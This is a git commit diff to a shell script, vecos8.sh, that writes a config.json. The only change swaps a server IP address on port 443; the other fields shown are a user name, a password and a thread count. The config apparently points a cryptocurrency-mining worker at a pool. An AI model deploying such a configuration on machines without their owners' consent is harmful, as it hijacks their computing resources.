33528cbf46470003d1bed105bef45be1aedac8df
barburonjilo <barburonjilo@outlook.co.id>
2025-03-28 11:12:42 +0700

    Update vecos8.sh

--- vecos8.sh
+++ vecos8.sh
@@ -7,7 +7,7 @@ current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
 # Create config.json with the current date
 cat > config.json <<END
 {
-  "url": "45.115.225.14:443",
+  "url": "45.115.224.91:443",
   "user": "edownload79",
   "pass": "worker1",
   "threads": 7,
